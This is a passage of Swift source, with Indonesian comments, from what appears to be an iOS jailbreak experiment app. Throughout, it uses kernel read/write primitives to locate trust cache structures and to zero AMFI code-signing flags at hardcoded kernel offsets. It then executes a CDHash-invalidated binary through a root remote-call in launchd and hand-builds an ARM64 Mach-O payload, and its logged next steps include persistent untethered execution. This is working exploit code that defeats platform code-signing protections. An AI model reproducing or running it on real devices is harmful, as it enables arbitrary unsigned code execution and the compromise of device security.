        for off in targetOffsets {
            let addr = dataSegBase &+ off
            // Read pointer
            let ptr = ds_kreadptr(addr)
            detail += "kc+0x\(String(format: "%x", off)) (0x\(String(format: "%llx", addr))):\n"
            detail += "  -> 0x\(String(format: "%llx", ptr))\n"
            
            if isSafeKernelHeapKreadAddress(ptr) {
                detail += "  ✅ Pointer menunjuk ke Heap!\n"
                // Analyze what is at the heap pointer
                let ver = safeKread32Heap(ptr)
                let cnt = safeKread32Heap(ptr &+ 4)
                let nextPtr = safeKread64Heap(ptr &+ 0x10)
                
                detail += "  Header [ver=\(ver), cnt=\(cnt)]\n"
                detail += "  Next ptr: 0x\(String(format: "%llx", nextPtr))\n"
                
                if (ver >= 1 && ver <= 16) || (cnt >= 1 && cnt <= 500_000) {
                    detail += "  🎯 Ini kemungkinan besar Trust Cache struct di Heap!\n"
                    foundHeapStructs += 1
                    
                    detail += "\n  Coba Write Test di Heap struct (+0x18 UUID field)...\n"
                    let testAddr = ptr &+ 0x18
                    let original = safeKread64Heap(testAddr)
                    let sentinel: UInt64 = 0xdeadbeefcafebabe
                    
                    ds_kwrite64(testAddr, sentinel)
                    let verify = safeKread64Heap(testAddr)
                    if verify == sentinel {
                        detail += "  ✅ Write Test SUKSES! (KTRR tidak memblokir Heap)\n"
                        // Restore
                        ds_kwrite64(testAddr, original)
                    } else {
                        detail += "  ❌ Write Test GAGAL! (Nilai tidak berubah)\n"
                    }
                } else {
                    detail += "  ⚠️ Header tidak cocok dengan trust cache.\n"
                }
            } else if ptr == 0 {
                detail += "  ⚠️ Nilai 0. (Belum ada dynamic trust cache yang diload)\n"
            } else {
                detail += "  ⚠️ Bukan pointer heap (kemungkinan __DATA atau mati).\n"
            }
            detail += "\n"
        }
        
        detail += "KESIMPULAN:\n"
        if foundHeapStructs > 0 {
            detail += "Berhasil menemukan Heap Trust Cache. Injeksi via KRW bisa dilakukan tanpa KTRR panic!\n"
        } else {
            detail += "Tidak ada Heap Trust Cache yang aktif. Pancing dengan mount Developer Disk Image / aplikasi lain.\n"
        }
        
        return ExperimentResult(name: expName, success: foundHeapStructs > 0, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 82: Deep Trust Cache Scan
    
    private func runExp82DeepTCScan() {
        isRunning = true
        runningLabel = "Deep TC Scan"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expDeepTCScan()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }
    
    private func expDeepTCScan() -> ExperimentResult {
        // TODO: implementasi deep TC scan
        return ExperimentResult(name: "Deep TC Scan (Exp 82)", success: false, detail: "Not implemented yet", timestamp: Date())
    }

    /// Stub: expTrustCacheWrite — implementasi asli dihapus (KTRR protected)
    /// Sekarang pakai TrustCacheInjector.m yang sudah di-fix offset-nya
    private func expTrustCacheWrite(rc: RemoteCall?, dryRun: Bool) -> ExperimentResult {
        let result = tc_injector_write_test()
        let log = String(cString: tc_injector_last_log())
        let success = result == TCInject_OK
        return ExperimentResult(name: "TC Write Test (Exp 79)", success: success, detail: log, timestamp: Date())
    }

    /// Stub: expWriteTest — delegates ke TrustCacheInjector
    private func expWriteTest() -> ExperimentResult {
        return expTrustCacheWrite(rc: nil, dryRun: true)
    }

    /// Stub: expInjectCDHash — delegates ke TrustCacheInjector
    private func expInjectCDHash() -> ExperimentResult {
        var dummyHash: [UInt8] = Array(repeating: 0x41, count: 20)
        let result = tc_injector_inject_cdhash(&dummyHash, 0)
        let log = String(cString: tc_injector_last_log())
        let success = result == TCInject_InjectOK
        return ExperimentResult(name: "TC CDHash Inject (Exp 79)", success: success, detail: log, timestamp: Date())
    }

    /// Stub: expRCTrustCacheAdd — via launchd RC
    private func expRCTrustCacheAdd(rc: RemoteCall) -> ExperimentResult {
        var detail = "Exp 80: RC Trust Cache Add\n"
        detail += "Mencoba load trust cache via launchd dlsym...\n\n"

        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let tcLoad = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                        remote_alloc_str(rc, "amfi_load_trust_cache"))
        detail += "amfi_load_trust_cache: 0x\(String(format: "%llx", tcLoad))\n"

        if tcLoad == 0 {
            detail += "❌ Tidak ditemukan di shared cache\n"
            detail += "Fungsi ini hanya ada di mobileassetd/cryptexd binary, bukan shared cache.\n"
            return ExperimentResult(name: "RC TC Add (Exp 80)", success: false, detail: detail, timestamp: Date())
        }

        detail += "✅ Found! Tapi butuh entitlement untuk call.\n"
        return ExperimentResult(name: "RC TC Add (Exp 80)", success: false, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93b: AMFI Flag Disable + Spawn Test

    /// Exp 93b: Flip ALL 10 AMFI boolean flags to 0, then test posix_spawn of unsigned binary.
    /// If AMFI checks are controlled by these flags, disabling them should allow unsigned exec.
    private func runExp93bAMFIFlagDisable() {
        isRunning = true
        runningLabel = "AMFI Disable"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93b_amfi_disable") { rc in
            let result = self.expAMFIFlagDisable(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func expAMFIFlagDisable(rc: RemoteCall) -> ExperimentResult {
        let expName = "AMFI Flag Disable (Exp 93b)"
        var detail = "Experiment 93b: AMFI Flag Disable + Spawn Test\n"
        detail += "================================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        // AMFI __DATA from deep_tc_analysis.py
        let amfiDataUnslid: UInt64 = 0xfffffff00a330098
        let amfiDataSlid = amfiDataUnslid &+ slide

        detail += "AMFI __DATA (slid): 0x\(String(format: "%llx", amfiDataSlid))\n\n"

        // All 10 boolean flags (value=1 in kernelcache, confirmed writable by Exp 93)
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]

        // Step 1: Read all flags before modification
        detail += "=== Step 1: Read current flag values ===\n"
        var originalValues: [(offset: UInt64, value: UInt64)] = []
        var allOnes = true

        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            let val = ds_kread64_safe(addr)
            originalValues.append((off, val))
            detail += "  AMFI+0x\(String(format: "%03x", off)): \(val)"
            if val == 1 {
                detail += " ✓\n"
            } else {
                detail += " ← NOT 1 (unexpected)\n"
                allOnes = false
            }
        }
        detail += "\n"

        if !allOnes {
            detail += "⚠️ Some flags are not 1 — might already be patched or wrong offset.\n"
            detail += "Proceeding anyway (will write 0 to all).\n\n"
        }

        // Step 2: Write 0 to ALL flags (disable AMFI checks)
        detail += "=== Step 2: Disable ALL AMFI flags (write 0) ===\n"
        var writeSuccessCount = 0

        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            ds_kwrite64(addr, 0)
            let readback = ds_kread64_safe(addr)
            let ok = (readback == 0)
            if ok { writeSuccessCount += 1 }
            detail += "  AMFI+0x\(String(format: "%03x", off)): write 0 → readback=\(readback) \(ok ? "✅" : "❌")\n"
        }
        detail += "\nFlags disabled: \(writeSuccessCount)/\(flagOffsets.count)\n\n"

        guard writeSuccessCount == flagOffsets.count else {
            detail += "❌ Not all flags could be written — aborting spawn test.\n"
            // Restore what we can
            for (off, origVal) in originalValues {
                ds_kwrite64(amfiDataSlid &+ off, origVal)
            }
            detail += "Restored original values.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "✅ All 10 AMFI flags set to 0!\n\n"

        // Step 3: Test posix_spawn of system binary
        detail += "=== Step 3: posix_spawn test ===\n\n"

        let testBinaries: [(path: String, label: String)] = [
            ("/usr/bin/id", "id (system binary)"),
            ("/bin/ls", "ls (system binary)"),
        ]

        var spawnSuccess = false
        let mem = rc.trojanMem

        for (binPath, label) in testBinaries {
            detail += "--- Testing: \(label) ---\n"

            let binAddr = remote_alloc_str(rc, binPath)

            // argv = [binary, NULL]
            let argvBase = mem + 0x500
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0)

            // pid output
            let pidAddr = mem + 0x480
            rc[pidAddr].setValue32(0)

            // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()

            detail += "  posix_spawn ret=\(ret), pid=\(pid)\n"

            if ret == 0 && pid != 0 {
                // Wait for child
                let statusAddr = mem + 0x490
                rc[statusAddr].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
                let exitStatus = rc[statusAddr].value32()
                let exitCode = exitStatus >> 8
                let signal = exitStatus & 0x7F

                detail += "  exit_status=0x\(String(format: "%x", exitStatus)), code=\(exitCode), signal=\(signal)\n"

                if signal == 9 {
                    detail += "  ❌ SIGKILL — AMFI still killing unsigned exec\n\n"
                } else if signal == 0 && exitCode <= 1 {
                    detail += "  ✅✅✅ SPAWN SUCCESS! No SIGKILL! ✅✅✅\n\n"
                    spawnSuccess = true
                } else {
                    detail += "  ⚠️ Exited with signal=\(signal), code=\(exitCode)\n\n"
                    if signal == 0 { spawnSuccess = true }
                }
            } else {
                let err = remote_errno(rc)
                detail += "  ❌ spawn failed: errno=\(err)\n\n"
            }

            RootExecutor.rcall(rc, "free", binAddr)

            if spawnSuccess { break }
        }

        // Step 4: Also try fork+exec pattern (in case posix_spawn has extra checks)
        if !spawnSuccess {
            detail += "--- Testing: fork + execve ---\n"

            let binAddr = remote_alloc_str(rc, "/usr/bin/id")
            let argvBase = mem + 0x500
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0)

            let childPid = RootExecutor.rcall(rc, "fork")
            detail += "  fork() = \(childPid)\n"

            if childPid == 0 {
                // We are in child — exec
                RootExecutor.rcall(rc, "execve", binAddr, argvBase, 0)
                // If execve returns, it failed
                RootExecutor.rcall(rc, "_exit", 127)
            } else if childPid != UInt64(bitPattern: -1) {
                // Parent — wait
                let statusAddr = mem + 0x490
                rc[statusAddr].setValue32(0)
                RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, 0)
                let exitStatus = rc[statusAddr].value32()
                let signal = exitStatus & 0x7F
                let exitCode = exitStatus >> 8

                detail += "  child exit: status=0x\(String(format: "%x", exitStatus)), signal=\(signal), code=\(exitCode)\n"

                if signal == 9 {
                    detail += "  ❌ SIGKILL on child — AMFI enforcement still active\n\n"
                } else if signal == 0 && exitCode != 127 {
                    detail += "  ✅ execve succeeded!\n\n"
                    spawnSuccess = true
                } else {
                    detail += "  ⚠️ execve might have failed (code=\(exitCode))\n\n"
                }
            } else {
                detail += "  ❌ fork() failed\n\n"
            }

            RootExecutor.rcall(rc, "free", binAddr)
        }

        // Step 5: Restore all flags
        detail += "=== Step 5: Restore AMFI flags ===\n"
        for (off, origVal) in originalValues {
            ds_kwrite64(amfiDataSlid &+ off, origVal)
            let readback = ds_kread64_safe(amfiDataSlid &+ off)
            detail += "  AMFI+0x\(String(format: "%03x", off)): restored to \(readback)\n"
        }
        detail += "\n"

        // Final verdict
        detail += "=== VERDICT ===\n\n"
        if spawnSuccess {
            detail += "🎉🎉🎉 FULL JAILBREAK ACHIEVED! 🎉🎉🎉\n\n"
            detail += "AMFI boolean flags control code signing enforcement!\n"
            detail += "Disabling all 10 flags allows unsigned binary execution!\n\n"
            detail += "=== NEXT STEPS ===\n"
            detail += "1. Binary search: find WHICH specific flag(s) are needed\n"
            detail += "2. Keep flags disabled permanently (until reboot)\n"
            detail += "3. Write custom unsigned binary and execute it\n"
            detail += "4. Build untether (persist across reboot)\n"
        } else {
            detail += "❌ Spawn still fails with AMFI flags disabled.\n\n"
            detail += "Possible reasons:\n"
            detail += "  1. These flags don't control CDHash validation\n"
            detail += "     (might be logging/telemetry flags)\n"
            detail += "  2. AMFI check happens BEFORE these flags are consulted\n"
            detail += "  3. pmap_cs (separate subsystem) also validates\n"
            detail += "  4. Trust cache lookup is in PPL, not affected by AMFI flags\n\n"
            detail += "=== ALTERNATIVE APPROACHES ===\n"
            detail += "  A. Try leaving flags disabled + inject CDHash into heap TC\n"
            detail += "  B. Binary search flags individually to find their purpose\n"
            detail += "  C. Combine with cs_enforcement_disable in main __DATA\n"
            detail += "  D. Patch proc->p_csflags via KRW (per-process bypass)\n"
        }

        return ExperimentResult(name: expName, success: spawnSuccess, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93c: AMFI Disable + Verified Spawn + Unsigned Binary

    /// Exp 93c: Definitive test — disable AMFI flags, verify paths exist, capture stdout,
    /// AND test spawning a COPIED binary (not in trust cache = different CDHash).
    private func runExp93cVerifiedSpawn() {
        isRunning = true
        runningLabel = "AMFI Verify"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93c_verified_spawn") { rc in
            let result = self.expAMFIVerifiedSpawn(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func expAMFIVerifiedSpawn(rc: RemoteCall) -> ExperimentResult {
        let expName = "AMFI Verified Spawn (Exp 93c)"
        var detail = "Experiment 93c: Verified Spawn + Unsigned Binary\n"
        detail += "==================================================\n\n"

        let kernBase = ds_get_kernel_base()
        let slide = kernBase - 0xfffffff007004000
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "KASLR slide: 0x\(String(format: "%llx", slide))\n\n"

        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
        let mem = rc.trojanMem

        // ============================================================
        // Step 0: Verify binary paths via open() (access() fails in RC)
        // ============================================================
        detail += "=== Step 0: Verify paths (open test) ===\n"

        // On iOS 18, small binaries like /usr/bin/id, /bin/ls are in shared cache
        // and DON'T exist as standalone files on disk!
        // Use /usr/libexec/amfid which is proven to be openable from launchd RC.
        let testPaths = ["/usr/libexec/amfid", "/usr/bin/id", "/bin/ls", "/bin/sh"]
        var validPath: String? = nil

        for path in testPaths {
            let pathAddr = remote_alloc_str(rc, path)
            let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_RDONLY), 0)
            if fd != UInt64(bitPattern: -1) {
                detail += "  open(\(path)): fd=\(fd) ✅\n"
                RootExecutor.rcall(rc, "close", fd)
                if validPath == nil { validPath = path }
            } else {
                detail += "  open(\(path)): FAIL ❌\n"
            }
            RootExecutor.rcall(rc, "free", pathAddr)
        }
        detail += "\n"

        guard let spawnPath = validPath else {
            detail += "❌ No openable binary found! Cannot proceed.\n"
            detail += "Falling back to fork+execve only (no copy test).\n\n"

            // Still do the flag disable + fork+execve test
            detail += "=== Fallback: Disable flags + fork+execve ===\n"
            var originalValues: [(offset: UInt64, value: UInt64)] = []
            for off in flagOffsets {
                let addr = amfiDataSlid &+ off
                let val = ds_kread64_safe(addr)
                originalValues.append((off, val))
                ds_kwrite64(addr, 0)
            }
            detail += "Flags disabled: 10/10\n\n"

            // Baseline: fork+execve trusted binary WITH flags enabled
            // (can't do baseline because flags already disabled — restore first)
            for (off, origVal) in originalValues { ds_kwrite64(amfiDataSlid &+ off, origVal) }
            detail += "--- [baseline] fork+execve /usr/bin/id (flags ON) ---\n"
            let bl = forkExecAndCapture(rc: rc, binaryPath: "/usr/bin/id", mem: mem)
            detail += bl.log + "\n"

            // Now disable again
            for off in flagOffsets { ds_kwrite64(amfiDataSlid &+ off, 0) }
            detail += "--- [test] fork+execve /usr/bin/id (flags OFF) ---\n"
            let t1 = forkExecAndCapture(rc: rc, binaryPath: "/usr/bin/id", mem: mem)
            detail += t1.log + "\n"

            // Restore
            for (off, origVal) in originalValues { ds_kwrite64(amfiDataSlid &+ off, origVal) }
            detail += "Flags restored.\n\n"

            detail += "=== VERDICT ===\n"
            detail += "Baseline: \(bl.success ? "✅" : "❌") (signal=\(bl.signal), code=\(bl.exitCode))\n"
            detail += "Test:     \(t1.success ? "✅" : "❌") (signal=\(t1.signal), code=\(t1.exitCode))\n\n"

            if bl.success && t1.success {
                detail += "⚠️ Both work — fork+execve trusted binary works regardless of flags.\n"
                detail += "Need unsigned binary test to confirm AMFI bypass.\n"
            } else if !bl.success && t1.success {
                detail += "🎉 Flags make a difference! Trusted binary only works with flags OFF.\n"
            } else {
                detail += "Both same result — flags don't affect fork+execve of trusted binary.\n"
            }

            return ExperimentResult(name: expName, success: t1.success && !bl.success, detail: detail, timestamp: Date())
        }
        detail += "Using: \(spawnPath)\n\n"

        // ============================================================
        // Step 1: Create unsigned binary (copy + modify = new CDHash)
        // ============================================================
        detail += "=== Step 1: Create unsigned test binary ===\n"

        let srcPathStr = spawnPath
        let dstPathStr = "/var/tmp/.exp93c_test"
        let srcPath = remote_alloc_str(rc, srcPathStr)
        let dstPath = remote_alloc_str(rc, dstPathStr)

        // Remove old copy
        RootExecutor.rcall(rc, "unlink", dstPath)

        // Open source
        let srcFd = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        guard srcFd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot open \(srcPathStr)\n"
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Open dest
        let dstFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        guard dstFd != UInt64(bitPattern: -1) else {
            detail += "❌ Cannot create \(dstPathStr)\n"
            RootExecutor.rcall(rc, "close", srcFd)
            RootExecutor.rcall(rc, "free", srcPath)
            RootExecutor.rcall(rc, "free", dstPath)
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Copy file
        let buf = mem + 0x800
        var totalCopied: UInt64 = 0
        for _ in 0..<512 {  // max 512 * 4096 = 2MB
            let nread = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
            if nread == 0 || nread == UInt64(bitPattern: -1) { break }
            RootExecutor.rcall(rc, "write", dstFd, buf, nread)
            totalCopied += nread
            if nread < 4096 { break }
        }
        RootExecutor.rcall(rc, "close", srcFd)
        RootExecutor.rcall(rc, "close", dstFd)

        detail += "Copied \(srcPathStr) → \(dstPathStr) (\(totalCopied) bytes)\n"

        // Patch 1 byte to invalidate CDHash (change padding byte near end of Mach-O header)
        let patchFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDWR), 0)
        if patchFd != UInt64(bitPattern: -1) {
            // Seek to offset 0x10 (padding area in mach_header_64) and flip a bit
            RootExecutor.rcall(rc, "lseek", patchFd, 0x10, 0)  // SEEK_SET
            rc[buf].setValue8(0x42)  // arbitrary byte
            RootExecutor.rcall(rc, "write", patchFd, buf, 1)
            RootExecutor.rcall(rc, "close", patchFd)
            detail += "Patched byte at offset 0x10 → CDHash now INVALID\n"
        }

        // chmod +x
        RootExecutor.rcall(rc, "chmod", dstPath, 0o755)
        detail += "chmod 755 done\n\n"

        // Verify unsigned binary exists via open
        let verifyFd = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_RDONLY), 0)
        if verifyFd != UInt64(bitPattern: -1) {
            detail += "Verify \(dstPathStr): EXISTS ✅\n\n"
            RootExecutor.rcall(rc, "close", verifyFd)
        } else {
            detail += "Verify \(dstPathStr): FAIL ❌\n\n"
        }

        // ============================================================
        // Step 2: BASELINE — fork+execve WITHOUT disabling flags
        // (posix_spawn returns ret=2 in launchd RC — use fork+execve)
        // ============================================================
        detail += "=== Step 2: Baseline (flags ENABLED) ===\n\n"

        // Test A: fork+execve original binary (trusted — should work)
        detail += "--- [baseline] fork+execve \(spawnPath) (trusted) ---\n"
        let baselineTrusted = forkExecAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
        detail += baselineTrusted.log
        detail += "\n"

        // Test B: fork+execve unsigned copy (should FAIL — SIGKILL by AMFI)
        detail += "--- [baseline] fork+execve \(dstPathStr) (unsigned) ---\n"
        let baselineUnsigned = forkExecAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
        detail += baselineUnsigned.log
        detail += "\n"

        // ============================================================
        // Step 3: Disable ALL AMFI flags
        // ============================================================
        detail += "=== Step 3: Disable AMFI flags ===\n"

        var originalValues: [(offset: UInt64, value: UInt64)] = []
        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            let val = ds_kread64_safe(addr)
            originalValues.append((off, val))
            ds_kwrite64(addr, 0)
        }

        // Verify all disabled
        var allDisabled = true
        for off in flagOffsets {
            let readback = ds_kread64_safe(amfiDataSlid &+ off)
            if readback != 0 { allDisabled = false }
        }
        detail += "Flags disabled: \(allDisabled ? "10/10 ✅" : "PARTIAL ❌")\n\n"

        guard allDisabled else {
            for (off, origVal) in originalValues { ds_kwrite64(amfiDataSlid &+ off, origVal) }
            detail += "❌ Could not disable all flags\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ============================================================
        // Step 4: Test spawns WITH flags disabled
        // ============================================================
        detail += "=== Step 4: Spawn tests (flags DISABLED) ===\n\n"

        // Test A: fork+execve original (trusted) binary
        detail += "--- [A] fork+execve \(spawnPath) (trusted, flags off) ---\n"
        let testA = forkExecAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
        detail += testA.log
        detail += "\n"

        // Test B: fork+execve UNSIGNED binary (THE CRITICAL TEST!)
        detail += "--- [B] fork+execve \(dstPathStr) (UNSIGNED, flags off) ---\n"
        let testB = forkExecAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
        detail += testB.log
        detail += "\n"

        // Test C: posix_spawn unsigned (might still fail with ret=2, but try)
        detail += "--- [C] posix_spawn \(dstPathStr) (UNSIGNED, flags off) ---\n"
        let testC = spawnAndCapture(rc: rc, binaryPath: dstPathStr, mem: mem)
        detail += testC.log
        detail += "\n"

        // Test D: fork+execve /var/tmp path (confirm /var/tmp accessible)
        detail += "--- [D] fork+execve \(spawnPath) with stdout pipe ---\n"
        let testD = spawnAndCapture(rc: rc, binaryPath: spawnPath, mem: mem)
        detail += testD.log
        detail += "\n"

        // ============================================================
        // Step 5: Restore flags
        // ============================================================
        detail += "=== Step 5: Restore AMFI flags ===\n"
        for (off, origVal) in originalValues {
            ds_kwrite64(amfiDataSlid &+ off, origVal)
        }
        detail += "All flags restored to 1\n\n"

        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)

        // ============================================================
        // VERDICT
        // ============================================================
        detail += "=== VERDICT ===\n\n"

        let unsignedSpawnOK = testB.success || testC.success
        let trustedSpawnOK = testA.success || testD.success
        let baselineUnsignedFailed = !baselineUnsigned.success

        detail += "Baseline (flags ON):  trusted=\(baselineTrusted.success ? "✅" : "❌"), unsigned=\(baselineUnsigned.success ? "✅" : "❌")\n"
        detail += "Test (flags OFF):     trusted=\(testA.success ? "✅" : "❌"), unsigned(B)=\(testB.success ? "✅" : "❌")\n\n"

        if unsignedSpawnOK && baselineUnsignedFailed {
            detail += "🎉🎉🎉 UNSIGNED BINARY EXECUTED! FULL JAILBREAK! 🎉🎉🎉\n\n"
            detail += "AMFI flags control CDHash enforcement!\n"
            detail += "Baseline: unsigned FAILED (AMFI blocked)\n"
            detail += "After disable: unsigned SUCCEEDED!\n\n"
            detail += "=== NEXT STEPS ===\n"
            detail += "1. Binary search which flag(s) are needed\n"
            detail += "2. Write custom payload binary\n"
            detail += "3. Keep flags disabled for persistent execution\n"
        } else if unsignedSpawnOK && !baselineUnsignedFailed {
            detail += "⚠️ Unsigned binary works BOTH with and without flags.\n"
            detail += "This means the binary is somehow already trusted,\n"
            detail += "OR fork+execve in launchd context bypasses AMFI regardless.\n\n"
            detail += "Need to verify: does the COPIED binary actually have different CDHash?\n"
        } else if trustedSpawnOK && !unsignedSpawnOK {
            detail += "⚠️ Trusted binary works but unsigned still blocked.\n"
            detail += "AMFI flags don't bypass CDHash validation.\n"
            detail += "Trust cache lookup still active (PPL-level).\n\n"
            detail += "Baseline unsigned signal: \(baselineUnsigned.signal)\n"
            detail += "Test B unsigned signal: \(testB.signal)\n"
            if baselineUnsigned.signal == testB.signal {
                detail += "Same failure mode → flags have NO effect on CDHash check.\n"
            } else {
                detail += "Different failure! Flags change behavior but don't fully bypass.\n"
            }
        } else {
            detail += "❌ No improvement with flags disabled.\n"
            detail += "Baseline trusted: \(baselineTrusted.success)\n"
            detail += "Test A trusted: \(testA.success)\n"
            detail += "Test B unsigned: \(testB.success)\n\n"
            detail += "These flags likely control logging/telemetry only.\n"
        }

        return ExperimentResult(name: expName, success: unsignedSpawnOK, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 93d: Custom Payload Execution

    /// Exp 93d: Write a minimal custom ARM64 Mach-O binary to /var/tmp,
    /// then fork+execve it and capture stdout via pipe.
    /// This is the DEFINITIVE test: can we execute ARBITRARY code?
    private func runExp93dCustomPayload() {
        isRunning = true
        runningLabel = "Custom Exec"
        guard mgr.dsready else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp93d_custom_payload") { rc in
            let result = self.expCustomPayload(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    /// Minimal ARM64 Mach-O that writes "JAILBROKEN\n" to stdout then exits.
    /// Hand-assembled — no compiler needed.
    private func buildMinimalMachO() -> [UInt8] {
        // ARM64 instructions for:
        //   mov x0, #1          ; stdout
        //   adr x1, msg         ; pointer to string
        //   mov x2, #11         ; length "JAILBROKEN\n"
        //   mov x16, #4         ; syscall write
        //   svc #0x80
        //   mov x0, #0          ; exit code
        //   mov x16, #1         ; syscall exit
        //   svc #0x80
        // msg: "JAILBROKEN\n"

        // Code section (at file offset 0x4000, vm 0x100004000 for arm64 page alignment)
        let writeStdout: [UInt32] = [
            0xD2800020,  // mov x0, #1 (stdout fd)
            0x100000E1,  // adr x1, #+28 (msg at PC+28 = 7 instructions * 4 = 28)
            0xD2800162,  // mov x2, #11 (length)
            0xD2800090,  // mov x16, #4 (SYS_write)
            0xD4001001,  // svc #0x80
            0xD2800000,  // mov x0, #0 (exit code)
            0xD2800030,  // mov x16, #1 (SYS_exit)
            0xD4001001,  // svc #0x80
        ]

        let msg: [UInt8] = Array("JAILBROKEN\n".utf8)

        // Build Mach-O structure
        // Layout:
        //   0x0000: mach_header_64
        //   0x0020: LC_SEGMENT_64 __PAGEZERO (vmaddr=0, vmsize=0x100000000)
        //   0x0068: LC_SEGMENT_64 __TEXT (vmaddr=0x100000000, fileoff=0, filesize=0x4040)
        //   0x00B0: LC_SEGMENT_64 __LINKEDIT (minimal)
        //   0x00F8: LC_MAIN (entryoff = 0x4000)
        //   0x4000: code + data

        var binary = [UInt8](repeating: 0, count: 0x4040)

        // Helper to write uint32 LE
        func w32(_ offset: Int, _ val: UInt32) {
            binary[offset + 0] = UInt8(val & 0xFF)
            binary[offset + 1] = UInt8((val >> 8) & 0xFF)
            binary[offset + 2] = UInt8((val >> 16) & 0xFF)
            binary[offset + 3] = UInt8((val >> 24) & 0xFF)
        }
        func w64(_ offset: Int, _ val: UInt64) {
            w32(offset, UInt32(val & 0xFFFFFFFF))
            w32(offset + 4, UInt32(val >> 32))
        }

        // mach_header_64 (32 bytes)
        w32(0x00, 0xFEEDFACF)  // magic
        w32(0x04, 0x0100000C)  // cputype = ARM64
        w32(0x08, 0x00000000)  // cpusubtype = ALL
        w32(0x0C, 0x00000002)  // filetype = MH_EXECUTE
        w32(0x10, 0x00000004)  // ncmds = 4
        w32(0x14, 0x00000100)  // sizeofcmds (will adjust)
        w32(0x18, 0x00200085)  // flags: MH_NOUNDEFS|MH_DYLDLINK|MH_TWOLEVEL|MH_PIE
        w32(0x1C, 0x00000000)  // reserved

        var cmdOff = 0x20  // after header

        // LC_SEGMENT_64 __PAGEZERO (72 bytes)
        w32(cmdOff + 0, 0x19)       // cmd = LC_SEGMENT_64
        w32(cmdOff + 4, 72)         // cmdsize
        // segname "__PAGEZERO" at cmdOff+8 (16 bytes)
        let pagezero = "__PAGEZERO\0\0\0\0\0\0"
        for (i, c) in pagezero.utf8.enumerated() { binary[cmdOff + 8 + i] = c }
        w64(cmdOff + 24, 0)                  // vmaddr
        w64(cmdOff + 32, 0x100000000)        // vmsize
        w64(cmdOff + 40, 0)                  // fileoff
        w64(cmdOff + 48, 0)                  // filesize
        w32(cmdOff + 56, 0)                  // maxprot
        w32(cmdOff + 60, 0)                  // initprot
        w32(cmdOff + 64, 0)                  // nsects
        w32(cmdOff + 68, 0)                  // flags
        cmdOff += 72

        // LC_SEGMENT_64 __TEXT (72 bytes)
        w32(cmdOff + 0, 0x19)       // cmd = LC_SEGMENT_64
        w32(cmdOff + 4, 72)         // cmdsize
